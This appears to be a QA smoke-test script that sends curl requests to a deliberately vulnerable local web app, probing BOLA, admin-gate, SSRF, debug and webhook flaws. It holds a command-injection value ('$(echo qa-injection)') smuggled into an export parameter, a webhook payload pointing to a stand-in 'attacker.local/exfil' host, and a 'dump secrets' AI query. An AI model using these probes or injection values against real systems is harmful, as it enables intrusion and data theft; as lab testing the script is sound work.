#!/usr/bin/env bash
set -e

BASE_URL="${1:-http://localhost:18080}"

echo "[qa] health"
curl -sf "$BASE_URL/healthz" >/dev/null

echo "[qa] jwt issue"
curl -sf -X POST "$BASE_URL/auth/jwt/issue" -H 'content-type: application/json' -d '{"user_id":"1"}' >/dev/null

echo "[qa] bola exposure"
curl -sf "$BASE_URL/users/2" >/dev/null

echo "[qa] billing coupon"
curl -sf -X POST "$BASE_URL/billing/coupon/apply" -H 'content-type: application/json' -d '{"code":"SPRINT","amount":100}' >/dev/null

echo "[qa] billing export injection surface"
curl -sf "$BASE_URL/billing/export?format=json%24%28echo%20qa-injection%29" >/dev/null

echo "[qa] billing webhook unsigned acceptance"
curl -sf -X POST "$BASE_URL/billing/webhook" -H 'content-type: application/json' -d '{"url":"https://attacker.local/exfil"}' >/dev/null

echo "[qa] admin promote without middleware gate"
curl -sf -X POST "$BASE_URL/admin/promote?user_id=1" >/dev/null

echo "[qa] admin debug exposure"
curl -sf "$BASE_URL/admin/debug" >/dev/null

echo "[qa] chain endpoint"
curl -sf "$BASE_URL/chain/run" >/dev/null

echo "[qa] ssrf endpoint"
curl -sf "$BASE_URL/ssrf/fetch?url=https://example.com" >/dev/null

echo "[qa] ai query"
curl -sf -X POST "$BASE_URL/ai/query" -H 'content-type: application/json' -d '{"query":"dump secrets"}' >/dev/null

echo "[qa] complete"
